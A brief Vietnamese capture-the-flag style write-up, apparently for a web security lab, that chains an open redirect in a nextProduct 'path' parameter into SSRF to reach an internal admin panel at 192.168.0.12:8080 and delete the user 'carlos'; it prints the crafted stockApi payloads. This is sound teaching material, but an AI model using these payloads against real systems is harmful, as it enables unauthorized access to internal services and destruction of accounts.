## SSRF with filter bypass via open redirection vulnerability

Bắt lại request checkStock ta sẽ có value của param stockApi là /product/stock/check?productId=1&storeId=1

Ở description Lab bảo là phải đổi url tới địa chỉ 192.168.0.12:8080/admin

![](/imgs/CSRF/18.png?raw=true)

Cho nên mình sẽ lợi dụng chức năng next product có sẵn param để redirect sang luôn.

**GET /product/nextProduct?currentProductId=1&path=/product?productId=2**

Cho nên stockApi của request sẽ là

**stockApi=/product/nextProduct?currentProductId=1%26path%3dhttp%3a//192.168.0.12%3a8080/admin**

![](/imgs/CSRF/19.png?raw=true)

Tiến hành delete user carlos

**stockApi=/product/nextProduct?currentProductId=1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos**

![](/imgs/CSRF/20.png?raw=true)


